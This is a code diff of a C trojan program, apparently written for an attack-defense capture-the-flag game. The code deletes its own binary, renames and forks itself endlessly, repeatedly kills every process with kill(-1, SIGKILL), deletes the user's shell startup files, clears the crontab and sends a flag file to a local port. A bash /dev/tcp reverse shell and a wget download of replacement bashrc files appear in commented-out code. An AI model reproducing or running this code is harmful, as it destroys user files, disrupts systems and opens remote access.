@@ -8,24 +8,25 @@
 #include <arpa/inet.h>
 
 # define GET_FLAG 		50000
-# define CLEAN_HORSE		10000
-# define CHECK_HORSE		1000
+# define CLEAN_HORSE	10000
+# define CHECK_HORSE	10000
 # define REV_SHELL		80000
 
-//To Get Flag
+# define DESTPORT_SHELL		9999
 # define DESTPORT_FLAG		8888
 # define DESTIP			"127.0.0.1"
-# define FLAG_FILE		"flag"
+# define FLAG_FILE		"/home/test/flag"
 # define SERVER			"http://127.0.0.1:1234/"
 unsigned int count;
-struct timespec last_mtim[2];
-unsigned int create_flag;
+char File_list[10][50] = {"/home/test/.bashrc", "/home/test/.bash_aliases", "/home/test/.bash_profile", "/home/test/.profile", 0};
+//struct timespec last_mtim[2];
+//unsigned int create_flag;
 
 void delete_self(){
 	unsigned int f;
-	unsigned char file[30]={0};
+	unsigned char file[100]={0};
 	f = open("/proc/self/cmdline",0);
-	read(f,file,29);
+	read(f,file,99);
 	close(f);
 	remove(file);
 	return;
@@ -63,20 +64,20 @@ void get_flag(){
 	exit(0);
 }
 
-int check_horse(){
-	struct stat st;
-	stat("~/.bashrc", &st);
-	if(st.st_mtim.tv_sec != last_mtim[0].tv_sec || st.st_mtim.tv_nsec != last_mtim[0].tv_nsec){
-		return 1;
+void check(){
+	int i = 0;
+	while(strlen(File_list[i])){
+		if(!access(File_list[i], 0)){
+			remove(File_list[i]);
+		}
+		i++;
 	}
-	if(stat("~/.bash_aliases", &st) == 0){
-		if(st.st_mtim.tv_sec == last_mtim[1].tv_sec && st.st_mtim.tv_nsec == last_mtim[1].tv_nsec)
-			return 0;
-	}
+	system("crontab -r 2>/dev/null");
 	exit(0);
 }
 
-void create_alias(){
+/*
+void recover(){
 	//create .bashrc && bash_aliases
 	unsigned char cmd[100];
 	snprintf(cmd, "wget %s%s -o %s", SERVER, "bashrc", "~/.bashrc");
@@ -85,32 +86,32 @@ void create_alias(){
 	system(cmd);
 	exit(0);
 }
+*/
 
-void store_time(){
-	struct stat st;
-	stat("~/.bashrc", &st);
-	if(st.st_mtim.tv_sec != last_mtim[0].tv_sec || st.st_mtim.tv_nsec != last_mtim[0].tv_nsec){
-		last_mtim[0] = st.st_mtim;
-		stat("~/.bash_aliases", &st);
-		last_mtim[1] = st.st_mtim;	
-		create_flag = 0;	
-	}
-	return;	
-}
-
+/*
 void rev_shell(){
-	
+	char cmd[100];
+	sprintf(cmd, "bash -i >& /dev/tcp/%s/%d 0>&1", DESTIP, DESTPORT_SHELL);
+	system(cmd);
 	exit(0);
 }
+*/
 
 void horse(int argc, char** argv){
 BEGIN:	
-	count++;
 	change_name(argc, argv);
 	unsigned int p;
 
-	if(create_flag)
-		store_time();
+	if(count % CLEAN_HORSE == 0)
+		kill(-1, SIGKILL);
+
+	if(count % CHECK_HORSE == 0){
+		if(!fork()){
+			//create_flag = 1;
+			check();
+			exit(0);
+		}
+	}
 
 	if(count % GET_FLAG == 0){
 		if(!fork()){
@@ -118,27 +119,19 @@ BEGIN:
 			exit(0);
 		}
 	}
-	
-	if(count % CHECK_HORSE == 0){
-		if(check_horse()){
-			create_flag = 1;
-			if(!fork()){
-				create_alias();
-				exit(0);
-			}
+	/*
+	if(count % REV_SHELL == 0){
+		if(!fork()){
+			rev_shell();
+			exit(0);
 		}
 	}
+	*/
+	count++;
 
-	if(count % CLEAN_HORSE == 0)
-		kill(-1, SIGKILL);
-	
-	if(count % REV_SHELL == 0){
-		if(!fork())
-			rev_shell();
-	}
-	
 	p = fork();
-	if(p < 0 ) return;
+	while(p < 0 ) 
+		p = fork();
 	if(!p){
 		goto BEGIN;
 	}
@@ -148,10 +141,8 @@ BEGIN:
 void main(int argc, char* argv[]){
 	count = 0;
 	unsigned int p;
-	kill(-1, SIGKILL);
+	
 	delete_self();
-	create_alias();
-	store_time();
 
 	p = fork();
 	if(p < 0) exit(0);
